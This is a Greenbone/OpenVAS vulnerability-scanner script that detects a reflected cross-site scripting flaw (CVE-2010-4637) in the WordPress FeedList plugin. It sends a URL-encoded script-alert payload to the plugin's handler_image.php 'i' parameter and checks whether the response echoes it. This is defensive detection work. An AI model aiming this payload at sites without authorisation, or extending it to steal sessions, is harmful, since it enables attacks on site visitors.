# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902327");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-01-03 16:00:43 +0100 (Mon, 03 Jan 2011)");
  script_cve_id("CVE-2010-4637");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress FeedList Plugin 'i' Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42197");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/63055");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/WordPress.Feed.List.2.61.01.Reflected.Cross-site.Scripting/56");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in the context of an affected
site.");
  script_tag(name:"affected", value:"WordPress FeedList plugin version 2.61.01");
  script_tag(name:"insight", value:"The flaw is due to an input passed to 'i' parameter in
'wp-content/plugins/feedlist/handler_image.php' script is not properly
sanitised before being returned to the user.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"WordPress is prone to a cross-site scripting (XSS) vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/wp-content/plugins/feedlist/handler_image.php?i=%3Cscript%3Ealert("XSS-Testing")%3C/script%3E';
req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res =~ "^HTTP/1\.[01] 200" && 'Cached file for <script>alert("XSS-Testing")</script> cannot be found' >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
